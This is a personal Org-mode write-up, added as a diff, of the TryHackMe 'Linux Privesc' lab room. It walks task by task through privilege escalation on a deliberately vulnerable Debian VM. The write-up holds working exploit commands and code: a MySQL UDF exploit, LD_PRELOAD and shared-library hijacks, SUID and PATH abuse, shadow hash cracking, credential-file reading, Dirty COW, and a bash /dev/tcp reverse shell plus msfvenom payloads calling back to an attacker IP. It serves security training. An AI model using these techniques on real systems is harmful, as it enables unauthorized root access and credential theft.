@@ -1,0 +1,567 @@
+#+TITLE: TryHackMe - Linux Privesc writeup
+#+FILETAGS: :privesc:
+
+- https://tryhackme.com/room/linuxprivesc
+- https://github.com/sagishahar/lpeworkshop
+
+	Several tools have been written which help find potential privilege escalations on Linux.
+
+	Some examples are:
+	- LinEnum.sh
+	- linpeas.sh
+	- lse.sh
+
+* Task 1: Deploy the Vulnerable Debian VM
+
+	*Run the "id" command. What is the result?*
+
+	#+begin_src shell
+		uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+	#+end_src
+
+* Task 2: Service Exploits
+
+	Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
+
+	https://www.exploit-db.com/exploits/1518
+
+ *Compile the exploit*
+
+ #+begin_src shell
+	 gcc -g -c raptor_udf2.c
+	 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+	 #+end_src
+
+ *Connect to the MySQL service as root*
+
+ #+begin_src shell
+	 mysql -u root
+ #+end_src
+
+ *Create a UDF 'do_system' using the compiled exploit*
+
+ #+begin_src shell
+	 use mysql;
+	 create table foo(line blob);
+	 insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+	 select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+	 create function do_system returns integer soname 'raptor_udf2.so';
+	 #+end_src
+
+ *Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission*
+
+ #+begin_src shell
+	 select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+ #+end_src
+
+ *Gain a shell running with root privileges*
+
+ #+begin_src shell
+	 /tmp/rootbash -p
+ #+end_src
+
+ If the -p option is supplied at invocation, the effective user id is not reset.
+
+[[/home/jb/Projects/hacking/tryhackme/images/linux-privesc1.png]]
+
+* Task 3: Weak File Permissions - Readable /etc/shadow
+
+	The '/etc/shadow' file contains user password hashes and is usually readable only by the root user.
+
+	#+begin_src shell
+		# on target machine
+		grep root /etc/shadow | cut -d ':' -f2 > hash.txt
+
+		# on Kali VM
+		scp user@10.10.25.55:hash.txt hash.tx
+		cat hash.txt | hashid
+		john --format=sha512crypt --worldlist=/usr/share/wordlists/rockyou.txt hash.txt
+	#+end_src
+
+	Switch to root user with `su root`.
+
+* Task 4: Weak File Permissions - Writable /etc/shadow
+
+	The '/etc/shadow' file contains user password hashes and is usually readable only by the root user.
+
+	*Generate a new password hash*
+
+	#+begin_src shell
+		mkpasswd -m sha-512 a_password
+	#+end_src
+
+	*Edit '/etc/shadow' and replace root user's password hash with the generated one, and switch to root user with `su root`.*
+
+* Task 5: Weak File Permissions - Writable /etc/passwd
+
+	The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user.
+
+	*Generate a new password hash*
+
+	#+begin_src shell
+		openssl passwd a_password
+	#+end_src
+
+	*Edit '/etc/password' with one of these options:*
+
+	- replace password hash of the root user's row (replacing the "x")
+	- copy and append root user's row to the bottom of the file, changing first instance of "root" to "newroot", and replacing password hash with generated one (replacing the "x").
+
+	*Switch to root user with `su root`.*
+
+* Task 6: Sudo - Shell Escape Sequences
+
+	List the programs which sudo allows your user to run:
+
+	#+begin_src shell
+		sudo -l
+	#+end_src
+
+	https://gtfobins.github.io/
+
+	*One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it? Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*
+
+	#+begin_src shell
+		sudo apache2 -f /etc/shadow
+	#+end_src
+
+[[/home/jb/Projects/hacking/tryhackme/images/linux-privesc2.png]]
+
+* Task 7: Sudo - Environment Variables
+
+	Sudo can be configured to inherit certain environment variables from the user's environment.
+
+	#+begin_src shell
+		sudo -l
+
+		Matching Defaults entries for user on this host:
+		env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+		User user may run the following commands on this host:
+		(root) NOPASSWD: /usr/sbin/iftop
+		#+end_src
+
+	 - LD_PRELOAD loads a shared object before any others when a program is run.
+	 - LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+
+** LD_PRELOAD
+
+		 *Create a shared object and set the LD_PRELOAD environment variable to the full path of the new shared object:*
+
+	 #+begin_src c preload.c
+		 #include <stdio.h>
+		 #include <sys/types.h>
+		 #include <stdlib.h>
+
+		 void _init() {
+			 unsetenv("LD_PRELOAD");
+			 setresuid(0,0,0);
+			 system("/bin/bash -p");
+		 }
+	 #+end_src
+
+	 `setresuid()` sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process: 0 is the root user id.
+
+	 #+begin_src shell
+		 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+		 sudo LD_PRELOAD=/tmp/preload.so man
+	 #+end_src
+
+** LD_LIBRARY_PATH
+
+	 #+begin_src shell
+		 # ldd prints shared library dependencies
+		 ldd /usr/sbin/apache2
+	 #+end_src
+
+	 *Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) and run apache2 using sudo while setting the LD_LIBRARY_PATH environment variable to /tmp.*
+
+	 #+begin_src c library_path.c
+		 #include <stdio.h>
+		 #include <stdlib.h>
+
+		 static void hijack() __attribute__((constructor));
+
+		 void hijack() {
+			 unsetenv("LD_LIBRARY_PATH");
+			 setresuid(0,0,0);
+			 system("/bin/bash -p");
+		 }
+	 #+end_src
+
+	 #+begin_src shell
+		 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+		 sudo LD_LIBRARY_PATH=/tmp apache2
+	 #+end_src
+
+	*Rename /tmp/libcrypt.so.1 to the name of another library and try again. Why did it not work? Modify library_path.c to make it work.*
+
+	#+begin_src shell
+		user@debian:~/tools/sudo$ mv /tmp/libcrypt.so.1 /tmp/libpcre.so.3
+		user@debian:~/tools/sudo$ sudo LD_LIBRARY_PATH=/tmp apache2
+		apache2: symbol lookup error: apache2: undefined symbol: pcre_free
+	#+end_src
+
+	Let's add the missing symbol to 'library_path.c':
+
+	#+begin_src c libray_path.c
+		#include <stdio.h>
+		#include <stdlib.h>
+
+		static void hijack() __attribute__((constructor));
+
+		void hijack() {
+			unsetenv("LD_LIBRARY_PATH");
+			setresuid(0,0,0);
+			system("/bin/bash -p");
+		}
+
+		void pcre_free() {}
+	#+end_src
+
+* Task 8: Cron Jobs - File Permissions
+
+	Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
+
+	#+begin_src shell
+		cat /etc/crontab
+		locate overwrite.sh
+		ls -l /usr/local/bin/overwrite.sh
+	#+end_src
+
+	'overwrite.sh' is world-writable! Let's replace its content:
+
+	#+begin_src shell
+		#!/bin/bash
+		bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 # replace ip adequately
+	#+end_src
+
+	Run `nc -lnvp 4444` on your attacking box to set up a netcat listener: a root shell should connect.
+
+* Task 9: Cron Jobs - PATH Environment Variable
+
+	[[/home/jb/Projects/hacking/tryhackme/images/linux-privesc3.png]]
+
+	The PATH variable starts with *'/home/user'* which is the user's home directory. *Create a file called 'overwrite.sh' in the user home directory:*
+
+	#+begin_src shell
+		#!/bin/bash
+
+		cp /bin/bash /tmp/rootbash
+		chmod +xs /tmp/rootbash
+	#+end_src
+
+	#+begin_src shell
+		chmod +x /home/user/overwrite.sh
+
+		# after cron job ran
+		/tmp/rootbash -p
+	#+end_src
+
+* Task 10: Cron Jobs - Wildcards
+
+	#+begin_src shell
+		cat /usr/local/bin/compress.sh
+
+		#!/bin/sh
+		cd /home/user
+		tar czf /tmp/backup.tar.gz *
+	#+end_src
+
+	GTOBins has a page for `tar` that shows command line options allowing to run other commands as part of a checkpoing feature.
+
+	https://gtfobins.github.io/gtfobins/tar/
+
+	*Let's use `msfvenom` on the attack to generate a reverse shell ELF binary*
+
+	#+begin_src shell
+		msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # replace LHOST with adequate ip address
+		scp shell.elf user@10.10.181.13:shell.elf
+	#+end_src
+
+	*In /home/user:*
+
+	#+begin_src shell
+		touch /home/user/--checkpoint=1
+		touch /home/user/--checkpoint-action=exec=shell.elf
+	#+end_src
+
+	When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+ *Set up a netcat listener on the attack box `nc -lnvp 4444`	and wait for the cron job to run: a root shell should connect.*
+
+* Task 11: SUID / SGID Executables - Known Exploits
+
+	*Find all the SUID/SGID executables:*
+
+	#+begin_src shell
+		find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+	#+end_src
+
+	`/usr/sbin/exim-4.84-3` has a known exploit for this version: CVE-2016-1531.
+
+	https://www.exploit-db.com/exploits/39535
+
+* Task 12: SUID / SGID Executables - Shared Object Injection
+
+	#+begin_src shell
+		/usr/local/bin/suid-so
+		strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+		#+end_src
+
+	[[/home/jb/Projects/hacking/tryhackme/images/linux-privesc4.png]]
+
+	*The executable tries to load '/home/user/.config/libcalc.so'. Let's create this file!*
+
+	#+begin_src c libcalc.c
+		#include <stdio.h>
+		#include <stdlib.h>
+
+		static void inject() __attribute__((constructor));
+
+		void inject() {
+			setuid(0);
+			system("/bin/bash -p");
+		}
+	#+end_src
+
+	#+begin_src shell
+		mkdir /home/user/.config
+		gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+	#+end_src
+
+	Running `/usr/local/bin/suid-so` will get a shell root.
+
+* Task 13: SUID / SGID Executables - Environment Variables
+
+	The '/usr/local/bin/suid-env executable' can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+
+	#+begin_src shell
+		/usr/local/bin/suid-env
+		strings /usr/local/bin/suid-env
+
+		/lib64/ld-linux-x86-64.so.2
+		5q;Xq
+		__gmon_start__
+		libc.so.6
+		setresgid
+		setresuid
+		system
+		__libc_start_main
+		GLIBC_2.2.5
+		fff.
+		fffff.
+		l$ L
+		t$(L
+		|$0H
+		service apache2 start
+	#+end_src
+
+	*'service apache2 start' suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.*
+
+	#+begin_src c
+		int main() {
+			setuid(0);
+			system("/bin/bash -p");
+		}
+	#+end_src
+
+	#+begin_src shell
+		gcc -o service /home/user/tools/suid/service.c
+		PATH=.:$PATH /usr/local/bin/suid-env
+	#+end_src
+
+	Running `/usr/local/bin/suid-env` will get a shell root.
+
+* Task 14: SUID / SGID Executables - Abusing Shell Features (#1)
+
+	The '/usr/local/bin/suid-env2' executable is identical to '/usr/local/bin/suid-env' except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+	#+begin_src shell
+		strings /usr/local/bin/suid-env2
+
+		/lib64/ld-linux-x86-64.so.2
+		__gmon_start__
+		libc.so.6
+		setresgid
+		setresuid
+		system
+		__libc_start_main
+		GLIBC_2.2.5
+		fff.
+		fffff.
+		l$ L
+		t$(L
+		|$0H
+		/usr/sbin/service apache2 start
+	#+end_src
+
+	*In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.*
+
+	Bash version can be verified with `/bin/bash --version`. A function named '/usr/sbin/service' can be created and exported as follow:
+
+	#+begin_src shell
+		function /usr/sbin/service { /bin/bash -p; }
+		export -f /usr/sbin/service
+	#+end_src
+
+	Running `/usr/local/bin/suid-env2` will get a shell root.
+
+* Task 15: SUID / SGID Executables - Abusing Shell Features (#2)
+
+	Note: This will not work on Bash versions 4.4 and above.
+
+	When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+
+	*Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:*
+
+	#+begin_src shell
+		env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+		/tmp/rootbash -p
+	#+end_src
+
+* Task 16: Password & Keys - History Files
+
+	If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+
+	View the contents of all the hidden history files in the user's home directory:
+
+	#+begin_src shell
+		cat ~/.*history | less
+	#+end_src
+
+
+	#+begin_src shell
+		cat /home/user/.*history | less
+
+				ls -al
+				cat .bash_history
+				ls -al
+				mysql -h somehost.local -uroot -ppassword123
+				exit
+				cd /tmp
+				clear
+				ifconfig
+				netstat -antp
+				nano myvpn.ovpn
+				ls
+				identify
+	#+end_src
+
+	Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+
+* Task 17: Password & Keys - Config Files
+
+	Note the presence of a myvpn.ovpn config file - it contains a reference to another location where the root user's credentials can be found.
+
+	#+begin_src shell
+		cat myvpn.ovpn
+
+				client
+				dev tun
+				proto udp
+				remote 10.10.10.10 1194
+				resolv-retry infinite
+				nobind
+				persist-key
+				persist-tun
+				ca ca.crt
+				tls-client
+				remote-cert-tls server
+				auth-user-pass /etc/openvpn/auth.txt
+				comp-lzo
+				verb 1
+				reneg-sec 0
+
+		cat /etc/openvpn/auth.txt
+	#+end_src
+
+* Task 18: Password & Keys - SSH Keys
+
+	Sometimes users make backups of important files but fail to secure them with the correct permissions.
+
+	The system root '/' contains a hidden directory '.ssh' with a word-readable file called 'root_key', a prive SSH key.
+
+	Copy the file over to the attack box and use it to connect to the target via SSH:
+
+	#+begin_src shell
+		chmod 600 root_key
+		ssh -i root_key root@10.10.10.10
+	#+end_src
+
+* Task 19: NFS
+
+	Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+	Check the NFS share configuration on the Debian VM:
+
+	#+begin_src shell /etc/exports
+		# /etc/exports: the access control list for filesystems which may be exported
+		#               to NFS clients.  See exports(5).
+		#
+		# Example for NFSv2 and NFSv3:
+		# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+		#
+		# Example for NFSv4:
+		# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+		# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+		#
+
+		/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+		#/tmp *(rw,sync,insecure,no_subtree_check)
+	#+end_src
+
+	Not that the '/tmp' share has root squashing disabled: *"no_root_squash"*.
+
+	*On the attack box, switch to root user, create a mount point and mount the /tmp share:*
+
+	#+begin_src shell
+		mkdir /tmp/nfs
+		mount -o rw,vers=2 10.10.180.69:/tmp /tmp/nfs
+	#+end_src
+
+	*On the attack box, generate a payload using msfvenom and save it to the mounted share:*
+
+	#+begin_src shell
+		msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+		chmod +xs /tmp/nfs/shell.elf
+	#+end_src
+
+	*Back on the target, as the low privileged account, execute the file to gain a root shell:*
+
+	#+begin_src shell
+		/tmp/shell.elf
+	#+end_src
+
+* Task 21: Kernel Exploits
+
+	Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+
+	*Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:*
+
+	#+begin_src shell
+		perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+	#+end_src
+
+	The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+	*Compile the code and run it (note that it may take several minutes to complete):*
+
+	#+begin_src shell
+		gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+		./c0w
+	#+end_src
+
+	*Once the exploit completes, run /usr/bin/passwd to gain a root shell:*
+
+	#+begin_src shell
+		/usr/bin/passwd
+	#+end_src
+
+	*Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!*
+
+	#+begin_src shell
+		mv /tmp/bak /usr/bin/passwd
+		exit
+	#+end_src
